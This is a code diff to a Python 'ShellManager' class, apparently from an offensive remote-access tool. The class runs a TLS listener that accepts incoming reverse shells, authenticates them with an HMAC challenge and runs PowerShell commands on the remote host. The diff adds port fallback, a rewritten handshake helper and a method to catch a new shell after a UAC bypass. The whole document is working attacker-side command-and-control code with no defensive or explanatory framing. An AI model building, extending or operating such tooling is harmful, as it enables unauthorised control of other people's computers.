@@ -8,8 +8,8 @@ import hmac
 import hashlib
 import tempfile
 import subprocess
-import random
-import string
+import os
+import time
 from rich.console import Console
 
 console = Console()
@@ -38,12 +38,12 @@ class ShellManager:
         self.config = config
         self.sock = None
         self.conn = None
+        self.addr = None
         self.ssl_context = None
         self.connected = False
-        self.challenge = None
 
     def start_listener(self, port):
-        """Start a TLS listener on the specified port."""
+        """Start a TLS listener on the specified port with fallback."""
         if self.config.cert_file and self.config.key_file:
             cert_file, key_file = self.config.cert_file, self.config.key_file
         else:
@@ -54,64 +54,96 @@ class ShellManager:
         self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         self.ssl_context.load_cert_chain(cert_file, key_file)
 
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.bind(('0.0.0.0', port))
-        self.sock.listen(5)
+        for attempt_port in range(port, port + 10):
+            try:
+                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                raw_sock.bind(('0.0.0.0', attempt_port))
+                raw_sock.listen(5)
+                self.sock = raw_sock
+                if attempt_port != port:
+                    console.print(f"[yellow]Port {port} busy, using {attempt_port}[/]")
+                self.config.listener_port = attempt_port
+                console.print(f"[green]TLS Listener started on port {attempt_port}[/]")
+                return
+            except OSError:
+                continue
+        raise Exception(f"No available ports in range {port}-{port+9}!")
 
-        console.print(f"[green]TLS Listener started on port {port}[/]")
+    def _perform_handshake(self, raw_conn):
+        """Internal helper to wrap socket in TLS and perform HMAC handshake."""
+        raw_conn.settimeout(10)
+        try:
+            conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
+            console.print(f"[dim]TLS handshake OK from {self.addr[0]}[/]")
+        except Exception as e:
+            console.print(f"[red]SSL error from {self.addr[0]}: {e}[/]")
+            raw_conn.close()
+            return None
+
+        conn.settimeout(10)
+        try:
+            challenge = os.urandom(16).hex()
+            conn.send(f"CHALLENGE:{challenge}\n".encode())
+            response = conn.recv(256).decode().strip()
+            expected = hmac.new(
+                self.config.handshake_secret.encode(),
+                challenge.encode(),
+                hashlib.sha256
+            ).hexdigest()
+
+            if response.lower() == expected.lower():
+                console.print(f"[bold green]AUTHENTICATED SHELL from {self.addr[0]}![/]")
+                return conn
+            else:
+                console.print(f"[red]Handshake FAILED from {self.addr[0]}[/]")
+                conn.close()
+                return None
+        except Exception as e:
+            console.print(f"[red]Handshake error: {e}[/]")
+            conn.close()
+            return None
 
     def wait_for_connection(self, timeout=300):
         """Wait for an incoming TLS connection with HMAC handshake."""
         self.sock.settimeout(timeout)
-        try:
-            client_sock, addr = self.sock.accept()
-            console.print(f"[yellow]Connection from {addr[0]}...[/]")
-
-            client_sock.settimeout(10)
-
+        start_time = time.time()
+        while True:
+            if time.time() - start_time > timeout:
+                return False
             try:
-                self.conn = self.ssl_context.wrap_socket(
-                    client_sock, server_side=True)
-            except ssl.SSLError as e:
-                console.print(f"[red]SSL handshake failed: {e}[/]")
-                client_sock.close()
-                return False
+                raw_conn, addr = self.sock.accept()
+                self.addr = addr
+                conn = self._perform_handshake(raw_conn)
+                if conn:
+                    self.conn = conn
+                    self.connected = True
+                    return True
             except socket.timeout:
-                console.print(f"[red]SSL handshake timeout[/]")
-                client_sock.close()
-                return False
-            except Exception as e:
-                console.print(f"[red]Connection error: {e}[/]")
-                client_sock.close()
+                continue
+            except Exception:
                 return False
 
-            self.challenge = ''.join(
-                random.choices(
-                    string.ascii_letters +
-                    string.digits,
-                    k=32))
-            self.conn.send(f"CHALLENGE:{self.challenge}\n".encode())
-
-            self.conn.settimeout(10)
-            response = self.conn.recv(1024).decode().strip()
-
-            expected = hmac.new(
-                self.config.handshake_secret.encode(),
-                self.challenge.encode(),
-                hashlib.sha256
-            ).hexdigest()
-
-            if response != expected:
-                console.print(f"[red]Handshake FAILED - invalid response[/]")
-                self.conn.close()
-                return False
-
-            self.connected = True
-            console.print(f"[bold green]TLS + HMAC Handshake SUCCESS![/]")
-            return True
-
+    def wait_for_new_shell(self, timeout=30):
+        """Wait for a new shell connection (e.g., after UAC bypass)."""
+        console.print(f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
+        try:
+            self.sock.settimeout(timeout)
+            raw_conn, addr = self.sock.accept()
+            self.addr = addr
+            conn = self._perform_handshake(raw_conn)
+            if conn:
+                if self.conn:
+                    try:
+                        self.conn.close()
+                    except Exception:
+                        pass
+                self.conn = conn
+                self.connected = True
+                return True
+            return False
         except socket.timeout:
+            console.print("[yellow]No new shell connected.[/]")
             return False
 
     def execute(self, cmd):
@@ -120,21 +152,21 @@ class ShellManager:
             return "[No shell connected]"
 
         try:
+            # Clear buffer
             self.conn.setblocking(0)
             try:
                 while self.conn.recv(4096):
                     pass
-            except BlockingIOError:
+            except Exception:
                 pass
             self.conn.setblocking(1)
 
             delimiter = self.config.cmd_delimiter
             wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
-
             self.conn.send((wrapped_cmd + "\n").encode())
+            
             self.conn.settimeout(self.config.cmd_timeout)
             output = ""
-
             while True:
                 try:
                     chunk = self.conn.recv(4096).decode(errors='ignore')
@@ -149,25 +181,8 @@ class ShellManager:
             if delimiter in output:
                 output = output.split(delimiter)[0]
 
-            lines = output.strip().split('\n')
-            cleaned = []
-            for line in lines:
-                stripped_line = line.strip()
-                if stripped_line.startswith(
-                        "PS") and stripped_line.endswith(">"):
-                    continue
-                if stripped_line == "PS>":
-                    continue
-                if cmd.strip() in stripped_line:
-                    continue
-                cleaned.append(line)
+            return output.strip() if output.strip() else "[No output captured]"
 
-            result = '\n'.join(cleaned).strip()
-            return result if result else "[No output captured]"
-
-        except BrokenPipeError:
-            self.connected = False
-            return "[Shell disconnected]"
         except Exception as e:
             self.connected = False
             return f"[Error: {e}]"
